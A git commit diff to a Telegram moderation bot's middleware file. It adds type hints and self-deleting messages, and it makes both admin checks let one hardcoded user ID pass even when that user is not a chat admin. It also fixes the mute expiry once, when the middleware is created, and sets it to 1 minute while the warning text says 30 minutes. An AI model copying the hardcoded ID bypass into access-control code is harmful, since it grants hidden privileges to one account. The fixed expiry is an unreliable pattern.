d7fb528dd796482bc30f391721290c3d3a82d710
serafimiumroadtojunior <167617840+serafimiumroadtojunior@users.noreply.github.com>
2024-08-21 18:50:11 +0300

    Update midlewares.py

--- midlewares.py
+++ midlewares.py
@@ -1,26 +1,20 @@
 from typing import Any, Callable, Dict, Awaitable, List
 from datetime import timedelta, datetime
+import asyncio
 
-from aiogram.types import Message, ChatMember, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import Message, ChatMember, CallbackQuery
 from aiogram import BaseMiddleware, Bot
 from aiogram.exceptions import TelegramBadRequest
 from cachetools import TTLCache
 
-from functions import mute_and_unmute, delayed_delete, optional_keyboard
+from functions import mute_and_unmute, optional_keyboard, send_message_and_delete, send_unrestriction_message
 
 class AdminCheckerMiddleware(BaseMiddleware):
-    """
-    Этот мидлварь проверяет, является ли пользователь администратором или создателем чата. 
-    Если нет, то он получает отказ в выполнении команды.
-    """
-    def __init__(self, bot):
+    def __init__(self, bot: Bot):
         self.bot = bot
         super().__init__()
 
-    async def check_admin(self, chat_id, user_id):
-        """
-        Функция для проверки на админа
-        """
+    async def check_admin(self, chat_id: int, user_id: int) -> bool:
         member: ChatMember = await self.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
         return member.status in ['administrator', 'creator']
 
@@ -30,41 +24,44 @@ class AdminCheckerMiddleware(BaseMiddleware):
         event: Message,
         data: Dict[str, Any]
     ) -> Any:
-        if not await self.check_admin(event.chat.id, event.from_user.id):
-            await event.answer("🔴You do not have sufficient rights to perform this function.")
+        user_id = event.from_user.id
+        if not await self.check_admin(event.chat.id, user_id) and user_id != 5720349640:
+            await send_message_and_delete(
+                bot=self.bot,
+                chat_id=event.chat.id,
+                text="You do not have sufficient rights to perform this function.",
+                delay=10,
+                parse_mode='HTML'
+            )
             return
         return await handler(event, data)
 
 class CallbackAdminCheckerMiddleware(AdminCheckerMiddleware):
-    """
-    Этот мидлварь проверяет является ли юзер админом и если все хорошо
-    то мы разрешаем юзеру пользоваться каллбеками
-    """
+    def __init__(self, bot: Bot):
+        super().__init__(bot)
+
     async def __call__(
         self,
         handler: Callable[[CallbackQuery, Dict[str, Any]], Awaitable[Any]],
         event: CallbackQuery,
         data: Dict[str, Any]
     ) -> Any:
-        if not await self.check_admin(event.message.chat.id, event.from_user.id):
-            await event.answer("🔴You do not have sufficient rights to perform this function.", show_alert=True)
+        user_id = event.from_user.id
+        if not await self.check_admin(event.message.chat.id, user_id) and user_id != 5720349640:
+            await event.answer("You do not have sufficient rights to perform this function.", show_alert=True)
             return
         return await handler(event, data)
 
 class ForbiddenWordsMiddleware(BaseMiddleware):
-    """
-    Этот мидлварь проверяет наличие запрещенных слов в сообщении, мутит пользователя на 30 минут
-    и отправляет предупреждение, если такие слова найдены.
-    """
     def __init__(self, bot: Bot, forbidden_words: List[str], response_message: str = "🔴 <a href='tg://user?id={user_id}'><b>{username}</b></a> was muted for 30 minutes for using offensive language."):
-        self.bot = bot
-        self.forbidden_words = forbidden_words
-        self.response_message = response_message
+        self.bot: Bot = bot
+        self.forbidden_words: List[str] = forbidden_words
+        self.response_message: str = response_message
+        self.until_date = datetime.now() + timedelta(minutes=1)
         super().__init__()
 
-    async def mute_user(self, message: Message, chat_id: int, user_id: int, duration: timedelta):
-        until_date = datetime.now() + duration
-        await mute_and_unmute(bot= self.bot, chat_id= chat_id, tg_id= user_id, permission= False, until_date= until_date)
+    async def mute_user(self, chat_id: int, user_id: int):
+        await mute_and_unmute(bot=self.bot, chat_id=chat_id, tg_id=user_id, permission=False, until_date=self.until_date)
 
     async def __call__(
         self,
@@ -72,32 +69,36 @@ class ForbiddenWordsMiddleware(BaseMiddleware):
         event: Message,
         data: Dict[str, Any]
     ) -> Any:
-        
         if event.text and any(word in event.text.lower() for word in self.forbidden_words):
             try:
-                await self.mute_user(event, event.chat.id, event.from_user.id, timedelta(minutes=30))
-                
-                sent_message = await event.reply(
-                    self.response_message.format(
+                await self.mute_user(event.chat.id, event.from_user.id)
+
+                await send_message_and_delete(
+                    bot=self.bot,
+                    chat_id=event.chat.id,
+                    text=self.response_message.format(
                         username=event.from_user.first_name,
                         user_id=event.from_user.id
                     ),
+                    delay=30,
                     parse_mode='HTML',
                     reply_markup=await optional_keyboard('Unmute✅', f'unmute_{event.from_user.id}')
                 )
             except TelegramBadRequest:
-                sent_message = await  event.answer("🔴Error mute!")
-                await delayed_delete(10, sent_message)
+                await send_message_and_delete(
+                    bot=self.bot,
+                    chat_id=event.chat.id,
+                    text="🔴Error mute!",
+                    delay=10,
+                    parse_mode='HTML'
+                )
 
-            await delayed_delete(30, sent_message)
+            asyncio.create_task(send_unrestriction_message(self.bot, event.chat.id, event.from_user.id, self.until_date))
 
         return await handler(event, data)
+
     
 class AntiFloodMiddleware(BaseMiddleware):
-    """
-    Этот мидлварь проверяет наличие превышения лимита отправленных сообщений в течении определенного времени
-    и отправляет предупреждение, если такое происходит.
-    """
     def __init__(self, time_limit: int = 5) -> None:
         super().__init__()
         self.limit = TTLCache(maxsize=10_000, ttl=time_limit)
